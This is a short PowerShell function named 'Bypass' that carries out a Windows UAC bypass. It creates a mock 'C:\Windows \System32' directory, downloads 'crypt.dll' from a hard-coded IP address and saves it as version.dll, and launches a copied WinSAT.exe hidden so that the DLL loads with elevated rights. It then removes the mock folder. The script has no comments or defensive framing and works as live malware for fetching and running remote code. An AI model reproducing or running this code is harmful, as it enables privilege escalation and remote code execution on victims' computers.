function Bypass
{
    $mockDirectory = '\\?\C:\Windows \System32';
    $uacBypass = "$mockDirectory\WinSAT.exe";
    $uacBypassCMD = "C:\Windows \System32\WinSAT.exe";

    $url = "http://139.59.147.33:8000/crypt.dll";

    New-Item "$mockDirectory" -ItemType Directory | Out-Null ;
    timeout 1 | Out-Null ;

    Invoke-WebRequest ("$url") -outfile "C:\Windows \System32\version.dll";

    cp C:\Windows\System32\WinSAT.exe "$uacBypass";
    start $uacBypassCMD -WindowStyle Hidden;
    Start-Sleep 5
    Get-Item -Path 'c:\Windows \System32\*' | Move-Item -Destination $env:temp -Force;
    Remove-Item "\\?\C:\Windows \" -Recurse -Force;
}
